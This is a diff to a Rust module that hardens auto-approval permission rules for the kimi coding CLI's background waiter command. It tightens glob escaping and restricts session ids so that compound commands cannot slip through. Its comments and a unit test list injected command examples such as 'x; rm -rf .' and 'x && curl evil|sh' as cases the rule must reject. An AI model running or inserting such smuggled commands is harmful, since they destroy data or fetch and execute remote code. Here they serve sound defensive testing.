@@ -5,7 +5,7 @@
 use crate::{
     lead_install::{
         waiter_command_prefix, LeadCap, LeadHook, LeadHookFormat, LeadInstallSpec, NativeContinue,
-        OfflineResume, MANAGED_MARK, REVIEW,
+        OfflineResume, WaiterShell, MANAGED_MARK, REVIEW,
     },
     variant::Installation,
 };
@@ -57,11 +57,19 @@ const SPEC: LeadInstallSpec = LeadInstallSpec {
     powershell: false,
     windows_override: false,
 };
-/// kimi permission 规则（picomatch）里需要转义的字符，与 2.6.0 源码 GLOB_LITERAL_SPECIAL 一致。
+/// 后台 Bash 是 `sh -c`（Windows 上 Git Bash），见 [`WaiterShell::PosixDoubleQuoted`]。
+const SHELL: WaiterShell = WaiterShell::PosixDoubleQuoted;
+
+/// 把文本当字面量放进 kimi permission 规则（picomatch 4.0.4）。
+///
+/// 在 kimi 2.6.0 源码 GLOB_LITERAL_SPECIAL（`[\\*?[\]{}()!+@|]`）之外**还要转义引号**：picomatch 把
+/// `"…"` 当引用语法、编出的正则里没有引号字符，而命令里有，于是带引号的规则一条都匹配不上
+/// （2026-11-13 从 kimi.exe 抽出它自带的 picomatch 4.0.4 实测：旧规则对合法等待命令也是 false，
+/// 等待器每次都要用户手点允许）。
 fn glob_literal(text: &str) -> String {
     text.chars()
         .flat_map(|c| {
-            let special = r"\*?[]{}()!+@|".contains(c);
+            let special = r#"\*?[]{}()!+@|"'"#.contains(c);
             special
                 .then_some('\\')
                 .into_iter()
@@ -70,12 +78,18 @@ fn glob_literal(text: &str) -> String {
         .collect()
 }
 
-/// 放行等待器的 permission 规则：只匹配本机 reporter 的 `lead wait --provider kimi --session <id>`，
-/// `*` 在 picomatch 里不跨 `/`，会话 id 里也没有 `/`，所以放不进别的命令。
+/// 会话 id 的通配：只认 `[A-Za-z0-9_-]` 一个以上（与 reporter 等待器的参数校验同一字符集）。
+///
+/// 不能用 `*`：kimi 对 Bash 规则拿**整条命令串**做 picomatch（2.6.0 resolveExecution →
+/// matchesGlobRuleSubject(ruleArgs, args.command)，不拆 `;`/`&&`/`|`），而 `*` 除 `/` 外什么都匹配，
+/// `--session x; rm -rf .`、`--session x && curl … | sh` 都会被自动放行（同上实测）。
+const SESSION_GLOB: &str = "+([A-Za-z0-9_-])";
+
+/// 放行等待器的 permission 规则：只匹配本机 reporter 的 `lead wait --provider kimi --session <id>`。
 fn waiter_rule(reporter: &str) -> String {
     format!(
-        "Bash({} --session *)",
-        glob_literal(&waiter_command_prefix("kimi", reporter))
+        "Bash({} --session {SESSION_GLOB})",
+        glob_literal(&waiter_command_prefix(SHELL, SPEC.provider, reporter))
     )
 }
 
@@ -97,14 +111,28 @@ fn is_waiter_rule(item: &dyn toml_edit::TableLike) -> bool {
 impl LeadCap for KimiLead {
     /// 关卡挂起时 TUI 里后台 Bash 跑等待器（PreToolUse 拦下写挂起关卡、给出原样命令）；完成通知让空闲 TUI 自己开新回合
     /// （2.6.0 源码 completeDetached → loop.notify，research-kimi-gemini.md 假模型实测）。
+    ///
     /// TUI 已退出时用 `-p` 续写同一会话：2026-11-13 假端点对照，`-p` 与 TUI 的请求头逐字一致
     /// （UA kimi-code-cli/2.6.0、X-Msh-Platform kimi_code_cli、turn_trigger user），计费路径相同；
-    /// 但 `-p` 会把这一轮的权限模式强制成 auto（runV2Print → setMode("auto")），宿主据此只让它做
-    /// 「确认答复、消费关卡」这一步（lead_native::waiter）。会话 id 已带 `session_` 前缀。
+    /// 但 `-p` 会把这一轮的权限模式强制成 auto（runV2Print → forceAuto，无条件），宿主据此只让它做
+    /// 「确认答复、消费关卡」这一步（lead_native::waiter）。为什么不像 gemini 那样交互式带首条消息
+    /// 重开 TUI：2.6.0 没有这个入口——根命令只有 `-p`（即 print 模式），`program.argument("[args...]")`
+    /// 遇到位置参数直接报 unknown command，`kimi session` 只有 list（2026-11-13 读 kimi.exe 内嵌源码
+    /// createProgram / validateOptions）。会话 id 已带 `session_` 前缀。
     fn native_continue(&self) -> Option<NativeContinue> {
         Some(NativeContinue::InSessionWaiter {
-            offline: OfflineResume::PrintMode(&["-S", "{session}", "-p", "{prompt}"]),
+            offline: OfflineResume::PrintMode {
+                args: &["-S", "{session}", "-p", "{prompt}"],
+                // 后台代跑不能顺手升级用户的 CLI（CLI 版本变了别回滚的教训：升级只能用户自己做）。
+                env: &[("KIMI_CODE_NO_AUTO_UPDATE", "1")],
+            },
+            shell: SHELL,
         })
+    }
+    /// 后台任务完成通知（notify）、PreToolUse 拦截与等待器都只在 2.6.0 查证过；2.5.x 能装 Lead，
+    /// 但续跑走手动提示（第一轮做空 M6）。
+    fn native_continue_floor(&self) -> Option<(u32, u32, u32)> {
+        Some((2, 6, 0))
     }
     fn edit_hook_file(
         &self,
@@ -215,5 +243,54 @@ impl LeadCap for KimiLead {
     }
     fn reviewer(&self) -> String {
         format!("---\nname: lead-redteam\ndescription: Independent adversarial review against the Lead specification.\ntools:\n  - Read\n  - Grep\n  - Glob\n  - Bash\nsubagents: []\n---\n\n{REVIEW}")
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// 做空 M8：放行规则不能放进复合命令。kimi 2.6.0 不拆 `;`/`&&`/`|`、拿整条命令做 picomatch，
+    /// 所以规则里不能有会吞下这些字符的通配；也不能留裸引号（picomatch 当引用语法吃掉，规则永不命中）。
+    /// 对照：kimi.exe 内嵌 picomatch 4.0.4 实测，本规则只命中 `--session session_abc-1`，
+    /// `x; rm -rf .`、`x && curl evil|sh`、`x$(id)`、反引号、换行、空格、空串、`a/b` 全部不命中。
+    #[test]
+    fn waiter_rule_only_admits_a_bare_session_id() {
+        for reporter in [
+            r"C:\Program Files (x86)\Meowo\meowo-reporter.exe",
+            r"C:\Users\o'neil\a+b\[x]\meowo-reporter.exe",
+            "/Applications/Meowo.app/Contents/MacOS/meowo-reporter",
+        ] {
+            let rule = waiter_rule(reporter);
+            let args = rule
+                .strip_prefix("Bash(")
+                .and_then(|r| r.strip_suffix(')'))
+                .unwrap();
+            let (prefix, session) = args.rsplit_once(" --session ").unwrap();
+            assert_eq!(session, SESSION_GLOB, "{rule}");
+            // 前缀里每个通配/引号字符都已转义：去掉转义对之后不剩任何特殊字符。
+            let mut chars = prefix.chars();
+            let mut bare = String::new();
+            while let Some(c) = chars.next() {
+                if c == '\\' {
+                    chars.next();
+                } else {
+                    bare.push(c);
+                }
+            }
+            assert!(
+                !bare.chars().any(|c| r#"*?[]{}()!+@|"'"#.contains(c)),
+                "{rule} 前缀里有未转义的特殊字符"
+            );
+            assert!(is_waiter_rule(&{
+                let mut t = toml_edit::Table::new();
+                t.insert("pattern", toml_edit::value(rule.as_str()));
+                t
+            }));
+        }
+        // 通配只认的字符集与 reporter 等待器的参数校验一致：合法 id 全在里面，shell 元字符一个不在。
+        let class = |c: char| c.is_ascii_alphanumeric() || matches!(c, '_' | '-');
+        assert!("session_0f3A-b".chars().all(class));
+        assert!(!";&|$`'\" \n/<>()".chars().any(class));
     }
 }
